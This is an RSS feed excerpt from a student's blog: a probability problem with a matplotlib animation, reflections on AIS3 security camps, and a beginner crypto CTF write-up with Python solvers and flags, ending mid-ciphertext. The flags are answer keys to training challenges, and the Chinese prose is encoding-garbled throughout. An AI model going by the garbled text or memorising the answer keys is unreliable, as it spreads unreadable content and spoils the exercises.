&lt;p&gt;ÈÄ£Á∫åÊäïÊì≤‰∏ÄÂÄãÂÖ¨Ê≠£È™∞Â≠êÂÖ©Ê¨°ÔºåÁ§æÂá∫ÁèæÁöÑÈªûÊï∏‰∏ÄÂè•ÁÇ∫a,bÔºåÂú®Â∫ßÊ®ôÂπ≥Èù¢‰∏äÔºåÂ∞áÁõ¥Á∑ö$$L:3x+4y=0$$ÂêëÂè≥Âπ≥ÁßªaÂñÆ‰ΩçÔºåÂÜçÂêë‰∏äÂπ≥ÁßªbÂñÆ‰ΩçÂæåÁç≤ÂæóÁõ¥Á∑öL&amp;#39;ÔºåÂâáÁõ¥Á∑öL&amp;#39;ËàáÂúì$$C:x^2+y^2=25$$‰∫§ÈªûÂÄãÊï∏ÁöÑÊúüÊúõÂÄºÊòØÂ§öÂ∞ëÔºü&lt;/p&gt;
&lt;h3&gt;ÂãïÁï´ÊºîÁ§∫&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt
from matplotlib.animation import FuncAnimation
circle_radius = 5
slope = -3 / 4
a_values = np.arange(1, 8)
b_values = np.arange(1, 8)
fig, ax = plt.subplots(figsize=(8, 10))
ax.set_xlim(-10, 10)
ax.set_ylim(-15, 10)
ax.set_aspect(&amp;#39;equal&amp;#39;, adjustable=&amp;#39;box&amp;#39;)
theta = np.linspace(0, 2 * np.pi, 100)
x_circle = circle_radius * np.cos(theta)
y_circle = circle_radius * np.sin(theta)
ax.plot(x_circle, y_circle, color=&amp;quot;blue&amp;quot;, label=&amp;quot;Circle C: $x^2 + y^2 = 25$&amp;quot;)
ax.grid(True, linestyle=&amp;#39;--&amp;#39;, alpha=0.7)
line, = ax.plot([], [], &amp;#39;r&amp;#39;, lw=1.5, alpha=0.7)
dice_a_text = ax.text(-7, 8, &amp;#39;&amp;#39;, fontsize=15, ha=&amp;#39;center&amp;#39;)
dice_b_text = ax.text(7, 8, &amp;#39;&amp;#39;, fontsize=15, ha=&amp;#39;center&amp;#39;)

def init():
    line.set_data([], [])
    dice_a_text.set_text(&amp;#39;&amp;#39;)
    dice_b_text.set_text(&amp;#39;&amp;#39;)
    return line, dice_a_text, dice_b_text

def uppubDate(frame):
    a, b = frame
    intercept = (3 * a + 4 * b) / 4
    x_vals = np.linspace(-10, 10, 100)
    y_vals = slope * x_vals + intercept
    line.set_data(x_vals, y_vals)
    dice_a_text.set_text(f&amp;#39;dice A: {a}&amp;#39;)
    dice_b_text.set_text(f&amp;#39;dice B: {b}&amp;#39;)
    return line, dice_a_text, dice_b_text

frames = [(a, b) for a in a_values for b in b_values]
ani = FuncAnimation(fig, uppubDate, frames=frames, init_func=init, blit=True, interval=300)
plt.xlabel(&amp;quot;x&amp;quot;)
plt.ylabel(&amp;quot;y&amp;quot;)
plt.legend()
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Âü∑Ë°åÁµêÊûú(Êì∑Âèñ)&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJfLnazMJe.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Wed, 30 Oct 2024 18:53:47 GMT</pubDate></item><item><title>2024 AIS3 JuniorÂä©ÊïôÂøÉÂæó</title><link>https://yih-0118.github.io/blog/2024-ais3-junior/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/2024-ais3-junior/</guid><description>Áï∂Âä©ÊïôÂ•ΩÁ¥Ø</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/2024-ais3-junior/&quot;&gt;https://yih-0118.github.io/blog/2024-ais3-junior/&lt;/a&gt;&lt;/blockquote&gt; &lt;!-- ##### ~~ÊàëÁõ¥Êé•ÊääÂÇôÂØ©ÊñáÁõ¥Êé•Ë§áË£ΩÈÅé‰æÜ~~
##### ~~Ëá™Â∑±Áúã‰∫ÜË¶∫ÂæóÂæàÂôÅ~~ --&gt;
&lt;!-- ÈÄôÊ¨°ÈÄèÈÅé AIS3Âä©ÁêÜÁöÑÈÇÄË´ã‰∏ãÔºåÊìî‰ªªÊú¨Ê¨° Junior ÁöÑÂä©ÊïôÂÖºÈöäËºîÔºå
ÂÖ∂‰∏≠‰πüÊÑüË¨ù AIS3 Áµ¶ÊàëÈÄôÊ®£ÁöÑÊ©üÊúÉ„ÄÇÈÄôÊ¨°Ë™≤Á®ãÈõÜ‰∏≠Âú®Á∂≤È†ÅÂÆâÂÖ®‰ª•Âèä AIÁöÑÂÆâÂÖ®ÊÄßÔºåÂÖ∂‰∏≠ AI ‰πüÊòØÊàëÊ≤íÁ¢∞ÈÅéÁöÑ‰∏ªÈ°åÔºå‰πüÊòØË∑üËëóÂ≠∏Âì°‰∏ÄÂêåÂ≠∏Áøí„ÄÇ
Êú¨Ê¨°Ê¥ªÂãïÊòØÁµ¶ÂúãÈ´ò‰∏≠ÁîüÁöÑË™≤Á®ãÔºåÊâÄ‰ª•Âú®ÊéßÁÆ°ÊñπÈù¢‰πüË¶ÅÊ†ºÂ§ñÂéªÂÅöÊ∫ñÂÇô„ÄÇÈõñÁÑ∂Âú®Èù∂Ê©üÂØ¶‰ΩúÊôÇÊúâÈÄ≤Ë°åÈÅéÂæàÂ§öÊ¨°ÁöÑË≥áÂÆâÂÄ´ÁêÜÂÆ£ÂÇ≥Ôºå‰ª•ÂèäÂ¶®Á§ôÈõªËÖ¶‰ΩøÁî®Á≠âÁõ∏ÈóúÊ¢ùÊñáÔºå‰ªçÊòØÊúâ‰∏çÁü•Â§©È´òÂú∞ÂéöÁöÑÂ≠∏Âì°ÊîªÊìäÈù∂Ê©üÂΩ±ÈüøÂ§ßÂÆ∂„ÄÇÁÇ∫Ê≠§ÔºåÊàëÂÄëÊê≠‰∫Ü OpenVPN server ÊúÄÂæåÁ¢∫ÂØ¶ÊâæÂà∞ÁúüÂÖáÔºå‰∏¶‰∏îÈÄ≤Ë°åÂö¥Âé≤Ë≠¥Ë≤¨„ÄÇ
ÂÜçËÄÖ4Â§©ÁöÑË™≤Á®ãËàáÂ∞àÈ°åÂØ¶‰Ωú‰∏≠ÔºåÊàëÁ¨¨‰∏ÄÊ¨°Â∏∂È†òËëóÂπæ‰πéÂêåÂπ¥Á¥ÄÁöÑÂ≠∏Âì°ÂéªÊßãÊÄùÔºåÁôºÊÉ≥ÔºåÂéªÈëΩÁ†î‰∏ªÈ°åÔºå‰∏ÄÊ≠•‰∏ÄÊ≠•ÁöÑÊåáÂºïÔºåÂà∞‰∏≠ÈñìÊîæÁîü‰ªñÂÄëÔºåÂÉÖÊèê‰æõ debug ÊàñÊòØÁ∂ìÈ©óÂàÜ‰∫´ÔºåËÆìÂ≠∏Âì°ÂÄëÂÖ±ÂêåËß£Ê±∫ÂïèÈ°å„ÄÇ‰πüÊÉ≥Ëµ∑ÂéªÂπ¥‰ªçÊòØÂ≠∏Âì°ÁöÑÊàëÔºå‰ªäÂπ¥ÂèóÈÇÄÁï∂‰∏ä‰∫ÜÂä©ÊïôÔºå‰πüÂä†ÂÖ•‰∫ÜË≥áÂÆâÂÇ≥ÊâøÁöÑÈöä‰ºç‰∏≠„ÄÇ --&gt;

&lt;ul&gt;
&lt;li&gt;ÁµÑÂÖßÂêàÁÖß
&lt;img src=&quot;https://hackmd.io/_uploads/B1Mrgxk2C.jpg&quot; alt=&quot;20240818_154513&quot;&gt;&lt;/li&gt;
&lt;li&gt;Âä©ÊïôÂêàÁÖß
&lt;img src=&quot;https://hackmd.io/_uploads/SJcrxgJ2A.jpg&quot; alt=&quot;20240818_AIS3_Junior-63&quot;&gt;&lt;/li&gt;
&lt;li&gt;‰∏≠Ê≠£Â§ßÂ≠∏ÈôÑËøëÊúÄÂ•ΩÂêÉÁöÑÁâõËÇâÈ∫µ
&lt;img src=&quot;https://hackmd.io/_uploads/Sk2Hgek3C.jpg&quot; alt=&quot;20240818_122951&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÊÑüË¨ùÁãÄ
&lt;img src=&quot;https://hackmd.io/_uploads/SyPjxg1h0.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 18 Aug 2024 15:03:24 GMT</pubDate></item><item><title>2024 AIS3 ÂøÉÂæó</title><link>https://yih-0118.github.io/blog/2024-ais3/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/2024-ais3/</guid><description>AIS3ËÆö</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/2024-ais3/&quot;&gt;https://yih-0118.github.io/blog/2024-ais3/&lt;/a&gt;&lt;/blockquote&gt; &lt;h5&gt;&lt;del&gt;ÊàëÁõ¥Êé•ÊääÂÇôÂØ©ÊñáÁõ¥Êé•Ë§áË£ΩÈÅé‰æÜ&lt;/del&gt;&lt;/h5&gt;
&lt;h5&gt;&lt;del&gt;Ëá™Â∑±Áúã‰∫ÜË¶∫ÂæóÂæàÂôÅ&lt;/del&gt;&lt;/h5&gt;
&lt;p&gt;AIS3‰ªäÂπ¥Âú®‰∫§Â§ßËàâË°åÁÇ∫Êúü‰∏ÄÈÄ±ÁöÑË≥áÂÆâË™≤Á®ãÔºåÂæû‰∏≠‰πüÂ∏∂Áµ¶ÊàëË®±Â§ö
ÊÑüÂèóÔºåË¨õÂ∏´ÈÉΩÊòØ‰æÜËá™Ê•≠ÁïåÊàñÊòØÂÖàÂâç AIS3 ÁöÑÊ†°ÂèãÂÄëÔºåÈÄôÂÄãË™≤Á®ãÈ¶ñÂÖàÂ∏∂Áµ¶ÊàëÁöÑË°ùÊìäÂ∞±ÊòØÔºåÈÄôÈñÄË™≤ÁöÑÈõ£Â∫¶ÊòØÊàëÊõæÊú™Êé•Ëß∏ÁöÑÔºåÁúãËëóÊóÅÈÇäÁöÑÂ≠∏Âì°ÂçªËÅΩÂæóÊïÖÁÑ∂Ëá™Ëã•ÔºåÂøÉÊÉ≥ËëóÂπ¥Á¥Ä‰∏¶Ê≤íÊúâÂ∑Æ‰∏çÂ§öÔºåÊÄéÂë¢ËÉΩÂäõÂ∞±Â∑ÆÈÄôÈ∫ºÂ§ö„ÄÇ
Âú®‰∫§ÊµÅÈÅéÂæåÂæóÁü•ÔºåÊØèÂÄã‰∫∫ÈÉΩÊòØ‰∏ÄÊ≠•Ê≠•Áà¨‰∏ä‰æÜÁöÑÔºåË≥áÂÆâÊòØÈúÄË¶ÅÁî®ÊôÇÈñìÂéªÁ¥ØÁ©çÁöÑÔºåÁï∂ÁÑ∂ÊúâÂÖà‰∫∫ÂèØËÉΩÂê∏Êî∂ÂæóÊØîÂø´ÔºåÁ∏ΩÁöÑ‰æÜË™™‰∏¶‰∏çÊòØÂèØ‰ª•‰∏Ä‰∏ãÂ∞±Âπ≥Ê≠•ÈùíÈõ≤ÁöÑ„ÄÇÔºåÊØèÂÄã‰∫∫ÈÉΩÊúâËá™Â∑±‰∏çÁÜüÊÇâÁöÑÈ†òÂüüÔºå‰ª•ÊàëËÄåË®ÄÔºåÂ∞ç webÈÄôÂ°äÊØîËºÉÊúâÁ†îÁ©∂ÔºåËÄåÂÖ∂‰ªñ‰∫∫ÊúÉÊòØÂÖ∂‰ªñÁ®ÆÔºåÈÄô‰∏ãÊàëÂÄëÈÉΩÊúÉÂΩºÊ≠§Ë´ãÊïôÔºåÂú®Êú™‰æÜÁöÑÂ∞àÈ°åÂÖ±ÂêåÂ•ÆÈ¨•„ÄÇ
ÊàëÂÄëÊòØÈÄ≤ÈöéË≥áÂÆâÊîªÈò≤Á´∂ÊäÄÁµÑÔºåÂ∞àÈ°åÊòØË¶ÅÂÅö CTF È°åÁõÆÔºåÂÖ∂‰∏≠Âä©ÊïôÂëäË®¥ÊàëÂÄëÔºåÂá∫È°åÁõÆÁöÑÈáçÈªûË¶ÅÊúâË∂£ËÄå‰∏îË¶ÅÂØåÂê´ÊïôËÇ≤ÊÑèÁæ©Ôºå‰∏çË¶ÅËÆì‰∫∫ÈÄöÈùàÔºåÈÄôÊâçÊòØËÉΩ‰øÉÈÄ≤Áü•Ë≠ò‰∫§ÊµÅÁöÑÈáçÈªû„ÄÇÊúÄÂæåÊàëÂÄëÂÖ±ÂêåÂàÜ‰∫´Ëá™Â∑±ÊâÄÈÅáÈÅéÁöÑÈ°åÂûã‰∏¶‰∏îÂ∞áÂÖ∂ÊîπÈÄ†ÔºåÂÖ∂‰∏≠ÔºöÊàëÂÄëÊääbinaryÂ•óÂú®online judge‰ª•ÈÅîÊàêÂ∞ápwnÈéñÂú®web ‰∏≠Ôºå‰πüÊãø‰∏ã‰∫ÜÊúÄ‰Ω≥Â∞àÈ°å„ÄÇ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ÁµÑÂÖßÂêàÁÖß
&lt;img src=&quot;https://hackmd.io/_uploads/rkaJ4x12R.jpg&quot; alt=&quot;FB_IMG_1723025018790&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂêàÊ†ºË≠âÊòé
&lt;img src=&quot;https://hackmd.io/_uploads/r1P_4x1nA.png&quot; alt=&quot;Êà™Âúñ 2024-08-30 15.27.09&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÊúÄ‰Ω≥Â∞àÈ°åÁçé
&lt;img src=&quot;https://hackmd.io/_uploads/BJHKVlk3C.jpg&quot; alt=&quot;Êà™Âúñ 2024-08-30 15.26.30&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 05 Aug 2024 15:31:59 GMT</pubDate></item><item><title>Cyber Security Summer Camp 2024 - Crypto writeup</title><link>https://yih-0118.github.io/blog/summer-camp-2024-crypto/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/summer-camp-2024-crypto/</guid><description>Ë¨õÂ∏´Â•ΩÂ∏•</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/summer-camp-2024-crypto/&quot;&gt;https://yih-0118.github.io/blog/summer-camp-2024-crypto/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;Â∞èÊèêÈÜí&lt;/h3&gt;
&lt;p&gt;Ë¨õÂ∏´CuriousÁöÑget-flag function:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(f&amp;#39;FLAG{{{hashlib.sha256(Êù±Êù±.encode()).hexdigest()}}}&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;1 - Classical Cipher&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;1 - Crypto Playground - ASCII &amp;amp; ÈÄ≤‰ΩçËΩâÊèõ&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Êää‰ª•‰∏ã‰∏âÊÆµÊï∏Â≠óËΩâÊàê ASCII Á∑®Á¢ºÂæåÁöÑÂ≠ó‰∏≤

70 76 65 71 123 74 117 115 116 95 //ÈÄôÊòØÂçÅÈÄ≤‰Ωç&amp;gt; FLAG{Just_

1110011 1101111 1101101 1100101 1011111 1100011 1101111 //ÈÄôÊòØ‰∫åÈÄ≤‰Ωç&amp;gt; some_co

6e 76 65 72 73 69 6f 6e 7e 7e 7e 7d //ÈÄôÊòØÂçÅÂÖ≠ÈÄ≤‰Ωç&amp;gt; nversion~~~}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{Just_some_conversion~~~}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;2 - ASCII &amp;amp; ÈÄ≤‰ΩçËΩâÊèõ&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ÂØ´ Python ‰æÜÊää‰ª•‰∏ãÁöÑÊï∏Â≠óËΩâÊàê ASCII Á∑®Á¢ºÂæåÁöÑÂ≠ó‰∏≤

46 4c 41 47 7b 4a 75 73 74 5f 61 5f 73 69 6d 70 6c 65 5f 50 79 74 68 6f 6e 5f 73 63 72 69 70 74 21 7d
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
def hex_to_ascii(hex_string):
    hex_list = hex_string.split()
    ascii_string = &amp;#39;&amp;#39;.join([chr(int(hex_num, 16)) for hex_num in hex_list])
    return ascii_string
hex_string = &amp;quot;46 4c 41 47 7b 4a 75 73 74 5f 61 5f 73 69 6d 70 6c 65 5f 50 79 74 68 6f 6e 5f 73 63 72 69 70 74 21 7d&amp;quot;
ans = hex_to_ascii(hex_string)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{Just_a_simple_Python_script!}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;3 - Crypto Playground - Hex String&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Êää‰ª•‰∏ãÁöÑ hex string ËΩâÊàê‰∏ÄËà¨Ë¢´ ASCII Á∑®Á¢ºÂæåÁöÑÂ≠ó‰∏≤

464c41477b495f6b6e6f775f7468655f616e737765725f69735f6062797465732e66726f6d686578602e2e2e7d
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
def hex_to_ascii(hex_string):
    byte_data = bytes.fromhex(hex_string)
    ascii_string = byte_data.decode(&amp;#39;ascii&amp;#39;)
    return ascii_string

hex_string = &amp;quot;464c41477b495f6b6e6f775f7468655f616e737765725f69735f6062797465732e66726f6d686578602e2e2e7d&amp;quot;
ans = hex_to_ascii(hex_string)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{I&lt;em&gt;know_the_answer_is&lt;/em&gt;&lt;code&gt;bytes.fromhex&lt;/code&gt;...}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;4 - Chinese To Hex String&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Êää‰ª•‰∏ãÁöÑ‰∏≠ÊñáÁî® Python ËΩâÊèõÊàêÈõªËÖ¶ÂÖßÂÑ≤Â≠òÂéüÂßãÊï∏ÊìöÁöÑ hex stringÔºåÂÜçÊääÈÄôÂÄã hex string ÊîæÂà∞ FLAG{} ÁöÑÂ§ßÊã¨Ëôü‰πãÈñìÔºàhex string ÁöÑËã±ÊñáÂÖ®ÈÉ®ÈÉΩÂ∞èÂØ´Ôºâ

Ëπ¶Ëπ¶ÁÇ∏ÂΩà
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
ans = &amp;#39;Ëπ¶Ëπ¶ÁÇ∏ÂΩà&amp;#39;.encode()
ans = ans.hex()
print(f&amp;#39;FLAG{{{ans}}}&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{e8b9a6e8b9a6e782b8e5bd88}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;5 - Crypto Playground - Base64&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Êää‰ª•‰∏ãÁöÑÂ≠ó‰∏≤ÊãøÂéªÂÅö base64 Ëß£Á¢º

RkxBR3tCYXNlNjRfaXNfbW9yZV9vZnRlbl91c2VkX2luX3JlYWxpdHl9
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
import base64
ans = base64.b64decode(&amp;quot;RkxBR3tCYXNlNjRfaXNfbW9yZV9vZnRlbl91c2VkX2luX3JlYWxpdHl9&amp;quot;).decode(&amp;#39;utf-8&amp;#39;)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{Base64_is_more_often_used_in_reality}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;6 - Base64 &amp;amp; Hex String&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Êää‰ª•‰∏ãÁöÑÂ≠ó‰∏≤Áî® Python ÂÖà base64 Ëß£Á¢ºÁÑ∂ÂæåÂÜçÂæû hex string ËΩâÊàê‰∏ÄËà¨Á∂ìÈÅé ASCII Á∑®Á¢ºÁöÑÂ≠ó‰∏≤

NDY0YzQxNDc3YjYwNjI3OTc0NjU3MzYwNWYyNjVmNjA3Mzc0NzI2MDVmNjE3MjY1NWY2NDY5NjY2NjY1NzI2NTZlNzQ1ZjY5NmU1ZjUwNzk3NDY4NmY2ZTdk
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
import base64
ans = base64.b64decode(&amp;quot;NDY0YzQxNDc3YjYwNjI3OTc0NjU3MzYwNWYyNjVmNjA3Mzc0NzI2MDVmNjE3MjY1NWY2NDY5NjY2NjY1NzI2NTZlNzQ1ZjY5NmU1ZjUwNzk3NDY4NmY2ZTdk&amp;quot;).decode(&amp;#39;utf-8&amp;#39;)
ans = bytes.fromhex(ans).decode(&amp;#39;ascii&amp;#39;)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;FLAG{`bytes`_&amp;amp;_`str`_are_different_in_Python}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;7 - Caesar Cipher With&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher.txt Ë£°Èù¢ÊòØ‰∏ÄÊÆµË¢´Âá±Ëñ©Âä†ÂØÜÁöÑÊï∏ÊìöÔºåÊääÈÄôÊÆµÊï∏ÊìöËß£ÂØÜÂæåÔºà‰∏çÈúÄË¶ÅÂàÜÊûêÈÄôÊÆµÊï∏ÊìöËß£ÂØÜÂæåÂú®Ë¨õ‰ªÄÈ∫ºÔºåÁêÜË´ñ‰∏äËß£ÂØÜÂæåÊúÉÊãøÂà∞‰∏ÄÊÆµÊòØÂÖ®Â§ßÂØ´ÁöÑÊï∏ÊìöÔºâÁõ¥Êé•‰∏üÂà∞ Crypto Playground ÁöÑ Get Flag Ë£°Êãø flag

//cipher.txt
ZNKIGKYGXIOVNKXOYGXKGRREURJIOVNKXCNOINOYXKGRRECKGQOSTUZYAXKNUCURJHKIGAYKOSZUURGFEZURUUQGZZNKCOQOVGMKGZZNKSUSKTZHAZOLOMAXKOZYMUZZUHKGZRKGYZROQKLOLZEEKGXYURJUXCNGZKBKXBGPJADLIVBAYKZNUYKRGYZZKTINGXGIZKXYGYZNKYURAZOUT
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;8 - Caesar Cipher With Python&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher.txt Ë£°Èù¢ÊòØ‰∏ÄÊÆµË¢´Âá±Ëñ©Âä†ÂØÜÁöÑÊï∏ÊìöÔºàÂíå‰∏ä‰∏ÄÈ°å‰∏ÄÊ®°‰∏ÄÊ®£ÁöÑÊï∏ÊìöÔºâÔºåÈÄôÈ°åÁöÑÁõÆÊ®ôÊòØÁî® Python ÊääÈÄôÊÆµÊï∏ÊìöËß£ÂØÜÔºåËß£ÂØÜÂæåÁöÑÊìç‰ΩúÂíå‰∏ä‰∏ÄÈ°å‰∏ÄÊ®£

//cipher.txt
ZNKIGKYGXIOVNKXOYGXKGRREURJIOVNKXCNOINOYXKGRRECKGQOSTUZYAXKNUCURJHKIGAYKOSZUURGFEZURUUQGZZNKCOQOVGMKGZZNKSUSKTZHAZOLOMAXKOZYMUZZUHKGZRKGYZROQKLOLZEEKGXYURJUXCNGZKBKXBGPJADLIVBAYKZNUYKRGYZZKTINGXGIZKXYGYZNKYURAZOUT
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
import hashlib
def caesar_decrypt(ciphertext, shift):
    plaintext = &amp;quot;&amp;quot;
    for char in ciphertext:
        if &amp;#39;A&amp;#39; &amp;lt;= char &amp;lt;= &amp;#39;Z&amp;#39;:
            decrypted_char = chr((ord(char) - ord(&amp;#39;A&amp;#39;) - shift) % 26 + ord(&amp;#39;A&amp;#39;))
        else:
            decrypted_char = char
        plaintext += decrypted_char
    return plaintext

cipher_text=&amp;#39;ZNKIGKYGXIOVNKXOYGXKGRREURJIOVNKXCNOINOYXKGRRECKGQOSTUZYAXKNUCURJHKIGAYKOSZUURGFEZURUUQGZZNKCOQOVGMKGZZNKSUSKTZHAZOLOMAXKOZYMUZZUHKGZRKGYZROQKLOLZEEKGXYURJUXCNGZKBKXBGPJADLIVBAYKZNUYKRGYZZKTINGXGIZKXYGYZNKYURAZOUT&amp;#39;

for shift in range(26):
    decrypted_text = caesar_decrypt(cipher_text, shift)
    if decrypted_text.isupper():
        print(f&amp;quot;{shift}:&amp;quot;)
        print(decrypted_text)

# ÁôºÁèæ6ÁöÑÊôÇÂÄôÊúÄÂÉèÔºåÂ∏∂ÂÖ•get-flag
plain = &amp;#39;THECAESARCIPHERISAREALLYOLDCIPHERWHICHISREALLYWEAKIMNOTSUREHOWOLDBECAUSEIMTOOLAZYTOLOOKATTHEWIKIPAGEATTHEMOMENTBUTIFIGUREITSGOTTOBEATLEASTLIKEFIFTYYEARSOLDORWHATEVERVAJDUXFCPVUSETHOSELASTTENCHARACTERSASTHESOLUTION&amp;#39;
print(f&amp;#39;FLAG{{{hashlib.sha256(plain.encode()).hexdigest()}}}&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{e241bb8575436ca05489e433b3f0782bf30c5ec286459cccd3a0830e718b6ded}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;9 - Substitution Cipher&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher.txt Ë£°Èù¢ÊòØ‰∏ÄÊÆµË¢´ÊõøÊèõÂºèÂä†ÂØÜÂæåÁöÑÊï∏ÊìöÔºåÊääÈÄôÊÆµÊï∏ÊìöËß£ÂØÜÂæåÔºà‰∏çÈúÄË¶ÅÂàÜÊûêÈÄôÊÆµÊï∏ÊìöËß£ÂØÜÂæåÂú®Ë¨õ‰ªÄÈ∫ºÔºåÁêÜË´ñ‰∏äËß£ÂØÜÂæåÊúÉÊãøÂà∞‰∏ÄÊÆµÊòØÂÖ®Â§ßÂØ´ÁöÑÊï∏ÊìöÔºâÁõ¥Êé•‰∏üÂà∞ Crypto Playground ÁöÑ Get Flag Ë£°Êãø flag

//cipher.txt
EANOEHHNFJLFXDGFANOYDJINTNOEDJXFOSBFESDOLGDWWSNUEDJNQCSJNUFEFFOUIDTTCOSIFESDOLNJKSINLEDNOXSONNJEZNSJMJDUCIELEDXCFJFOENNGFANOYDJINTNOEFIINLLEDFGGUFEFFYENJGNOXEZHUNWFENFOUKSXDJDCLMJNUSIESDOLDYNOYDJINTNOEIZFOONGLXDSOXUFJREZNLNFEENTMELEDJNXCGFENEZNNTNJXSOXSOENJONEANJNFWFOUDONUSOEZNSOENJKNOSOXHNFJLSOODKFESDODOEZNSOENJONEYGDCJSLZNUFOUGFANOYDJINTNOEFXNOISNLYDCOUONAFOUTDJNNYYNIESKNTNFOLDYFIINLLSOXKFLEGHGFJXNJQCFOESESNLDYUFEFEDUFHANFJNFXFSOZNFJSOXIFGGLYDJJNXCGFESDOEDTFOUFENEZNMJDKSLSDODYNPINMESDOFGFIINLLTNIZFOSLTLSOEZSLJNMDJEFXJDCMDYIDTMCENJLISNOESLELFOULNICJSEHNPMNJELTFOHDYAZDTMFJESISMFENUSOFLECUHDYEZNLNLFTNEDMSILZFLIDOKNONUEDNPMGDJNEZNGSRNGHNYYNIELDYSTMDLSOXNPEJFDJUSOFJHFIINLLTFOUFENLANZFKNYDCOUEZFEEZNUFTFXNEZFEIDCGUWNIFCLNUWHGFANOYDJINTNOENPINMESDOFGFIINLLJNQCSJNTNOELADCGUWNNKNOXJNFENJEDUFHEZFOSEADCGUZFKNWNNOHNFJLFXDSOEZNAFRNDYEZNXJDASOXNIDODTSIFOULDISFGIDLEDYEZNYCOUFTNOEFGSOLNICJSEHDYEDUFHLSOENJONENOKSJDOTNOEFOHMJDMDLFGLEZFEFGENJEZNLNICJSEHUHOFTSILDOGSONLZDCGUWNFMMJDFIZNUASEZIFCESDONPINMESDOFGFIINLLADCGUYDJINSOENJONELHLENTUNKNGDMNJLEDJNKNJLNYDJAFJULNIJNIHUNLSXOMJFIESINLEZFELNNREDTSOSTSBNEZNSTMFIEDOCLNJMJSKFIHAZNOLHLENTLFJNWJNFIZNUEZNIDTMGNPSEHDYEDUFHLSOENJONENOKSJDOTNOEASEZTSGGSDOLDYFMMLFOUXGDWFGGHIDOONIENULNJKSINLTNFOLEZFEONAGFANOYDJINTNOEJNQCSJNTNOELFJNGSRNGHEDSOEJDUCINCOFOESISMFENUZFJUEDUNENIELNICJSEHYGFALWNHDOUEZNLNFOUDEZNJENIZOSIFGKCGONJFWSGSESNLEZNMJDLMNIEDYXGDWFGGHUNMGDHNUNPINMESDOFGFIINLLLHLENTLJFSLNLUSYYSICGEMJDWGNTLFWDCEZDALCIZFONOKSJDOTNOEADCGUWNXDKNJONUFOUZDAEDNOLCJNEZ